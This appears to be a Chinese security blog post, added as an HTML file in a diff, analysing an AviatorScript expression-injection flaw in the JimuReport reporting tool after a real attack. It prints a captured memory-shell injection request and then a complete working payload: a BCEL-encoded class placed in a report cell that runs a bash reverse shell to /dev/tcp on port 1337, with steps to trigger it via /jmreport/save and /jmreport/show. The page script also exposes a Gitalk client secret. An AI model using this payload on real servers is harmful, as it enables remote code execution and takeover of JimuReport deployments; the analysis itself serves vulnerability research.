@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>积木报表存在aviator表达式注入漏洞 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="前言
+先不写
+介绍
+https://github.com/killme2008/aviatorscript
+AviatorScript 是一门高性能、轻量级寄宿于 JVM （包括 Android 平台）之上的脚本语言。
+积木报表
+https..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">积木报表存在aviator表达式注入漏洞</h2>
+            <div class="post-date">2024-08-01</div>
+            
+            <div class="post-content" v-pre>
+              <h1 id="前言">前言</h1>
+<p>先不写</p>
+<h1 id="介绍">介绍</h1>
+<p>https://github.com/killme2008/aviatorscript</p>
+<p>AviatorScript 是一门高性能、轻量级寄宿于 JVM （包括 Android 平台）之上的脚本语言。</p>
+<p>积木报表<br>
+https://github.com/jeecgboot/JimuReport</p>
+<p>一款免费的数据可视化报表，含报表、仪表盘和大屏设计，像搭建积木一样在线设计报表！功能涵盖，数据报表、打印设计、图表报表、大屏设计等！</p>
+<p>https://github.com/jeecgboot/JeecgBoot<br>
+在jeecg-boot中有集成积木报表，且非常常见。</p>
+<h2 id="流量捕获">流量捕获</h2>
+<p>这里略，反正就是被漏洞打了，然后抓到流量了，不过流量只有一半。。。。</p>
+<p>head头</p>
+<pre><code class="language-http">POST /jmreport/save HTTP/2
+Content-Type: application/json
+</code></pre>
+<p>post数据如下所示，看到ReflectUtils.defineClass就知道应该是注入内存马了。</p>
+<pre><code class="language-json">{&quot;designerObj&quot;:{&quot;id&quot;:&quot;949097799684018176&quot;,&quot;code&quot;:&quot;20240511102253&quot;,&quot;name&quot;:&quot;test&quot;,&quot;note&quot;:null,&quot;status&quot;:null,&quot;type&quot;:&quot;printinfo&quot;,&quot;jsonStr&quot;:&quot;{\&quot;loopBlockList\&quot;:[],\&quot;printConfig\&quot;:{\&quot;layout\&quot;:\&quot;portrait\&quot;,\&quot;printCallBackUrl\&quot;:\&quot;\&quot;,\&quot;paper\&quot;:\&quot;A4\&quot;,\&quot;isBackend\&quot;:false,\&quot;width\&quot;:210,\&quot;definition\&quot;:1,\&quot;marginX\&quot;:10,\&quot;height\&quot;:297,\&quot;marginY\&quot;:10},\&quot;hidden\&quot;:{\&quot;rows\&quot;:[],\&quot;cols\&quot;:[]},\&quot;dbexps\&quot;:[],\&quot;dicts\&quot;:[],\&quot;freeze\&quot;:\&quot;A1\&quot;,\&quot;dataRectWidth\&quot;:100,\&quot;autofilter\&quot;:{},\&quot;validations\&quot;:[],\&quot;cols\&quot;:{\&quot;len\&quot;:50},\&quot;area\&quot;:false,\&quot;pyGroupEngine\&quot;:false,\&quot;excel_config_id\&quot;:\&quot;949097799684018176\&quot;,\&quot;hiddenCells\&quot;:[],\&quot;zonedEditionList\&quot;:[],\&quot;rows\&quot;:{\&quot;0\&quot;:{\&quot;cells\&quot;:{\&quot;0\&quot;:{\&quot;text\&quot;:\&quot;123\&quot;}}},\&quot;len\&quot;:100},\&quot;rpbar\&quot;:{\&quot;show\&quot;:true,\&quot;pageSize\&quot;:\&quot;\&quot;,\&quot;btnList\&quot;:[]},\&quot;fixedPrintHeadRows\&quot;:[],\&quot;fixedPrintTailRows\&quot;:[],\&quot;displayConfig\&quot;:{},\&quot;background\&quot;:false,\&quot;name\&quot;:\&quot;sheet1\&quot;,\&quot;styles\&quot;:[],\&quot;freezeLineColor\&quot;:\&quot;rgb(185, 185, 185)\&quot;,\&quot;merges\&quot;:[]}&quot;,&quot;apiUrl&quot;:null,&quot;apiMethod&quot;:null,&quot;apiCode&quot;:null,&quot;thumb&quot;:null,&quot;template&quot;:0,&quot;createBy&quot;:&quot;15296066620&quot;,&quot;createTime&quot;:&quot;2024-05-11 10:22:54&quot;,&quot;updateBy&quot;:null,&quot;updateTime&quot;:&quot;2024-05-11 10:22:54&quot;,&quot;dataList&quot;:null,&quot;dictInfo&quot;:null,&quot;delFlag&quot;:0,&quot;viewCount&quot;:0,&quot;cssStr&quot;:null,&quot;jsStr&quot;:null,&quot;pyStr&quot;:null,&quot;tenantId&quot;:null,&quot;isRefresh&quot;:null,&quot;shareViewUrl&quot;:null},&quot;name&quot;:&quot;sheet1&quot;,&quot;freeze&quot;:&quot;A1&quot;,&quot;freezeLineColor&quot;:&quot;rgb(185, 185, 185)&quot;,&quot;styles&quot;:[],&quot;displayConfig&quot;:{},&quot;printConfig&quot;:{&quot;layout&quot;:&quot;portrait&quot;,&quot;printCallBackUrl&quot;:&quot;&quot;,&quot;paper&quot;:&quot;A4&quot;,&quot;isBackend&quot;:false,&quot;width&quot;:210,&quot;definition&quot;:1,&quot;marginX&quot;:10,&quot;height&quot;:297,&quot;marginY&quot;:10},&quot;merges&quot;:[],&quot;rows&quot;:{&quot;0&quot;:{&quot;cells&quot;:{&quot;0&quot;:{&quot;text&quot;:&quot;123&quot;},&quot;1&quot;:{}}},&quot;9&quot;:{&quot;cells&quot;:{&quot;6&quot;:{&quot;text&quot;:&quot;=(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('org.apache.catalina.filters.$ProxyInterceptor$$Lambda$1',Base64Utils.decodeFromString('yv66vgAAAD
+</code></pre>
+<h2 id="分析流程">分析流程</h2>
+<p>不知道具体啥漏洞，一脸懵，但是大概知道是text参数里可以命令执行。</p>
+<p>去网上搜漏洞，搜到一个人发现的bug🤣</p>
+<p>https://www.cnblogs.com/voyager-fu/p/16091838.html</p>
+<p>他在使用有单独的<code>=</code>在text中时会出错，分析具体代码发现，程序会将<code>=</code>后的字符当作AviatorScript来解析。这个也和捕获的流量很符合😋</p>
+<p>继续去后的字符当作AviatorScript官网看历史漏洞，发现很早就有人发现存在表达式漏洞<br>
+https://github.com/killme2008/aviatorscript/issues/421<br>
+项目作者建议是增加鉴权和控制可以访问的 class 白名单（反正和作者没关系😤）</p>
+<p>看到最下面还有人提到积木报表中的多个依赖安全漏洞（就不修）🤣</p>
+<p>根据文章提示，使用BCELClassloader加载BCEL编码的形式完成RCE。</p>
+<p>官网地址:<br>
+http://www.jimureport.com/</p>
+<p>创建一张报表，然后打开<br>
+<img src="https://fallingskies22.github.io/post-images/1722527110533.png" alt="" loading="lazy"></p>
+<p>点击保存，就会有/jmreport/save的数据包了。<br>
+<img src="https://fallingskies22.github.io/post-images/1722526832871.png" alt="" loading="lazy"></p>
+<p>在一个text参数中输入payload<br>
+<img src="https://fallingskies22.github.io/post-images/1722527046527.png" alt="" loading="lazy"><br>
+payload</p>
+<pre><code>=((c=(Class.forName('$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A',true,new com.sun.org.apache.bcel.internal.util.ClassLoader())))+(c.exec('bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/ip/1337 0&gt;&amp;1')))
+</code></pre>
+<p>在访问一下生成的报表，这里使用接口是/jmreport/show</p>
+<p>访问后看见文本内容变成下面这样了，这个UNIXProcess@6abe63e7就代表执行成功了。<br>
+<img src="https://fallingskies22.github.io/post-images/1722527227775.png" alt="" loading="lazy"></p>
+<p>然后看看vps上，成功获取到shell<br>
+<img src="https://fallingskies22.github.io/post-images/1722527302566.png" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1722527309213.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/php-webshellji-yi-ci-bu-huo-de-php-mian-sha-ma/">
+                  <h3 class="post-title">
+                    [PHP webshell]记一次捕获的php免杀马
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
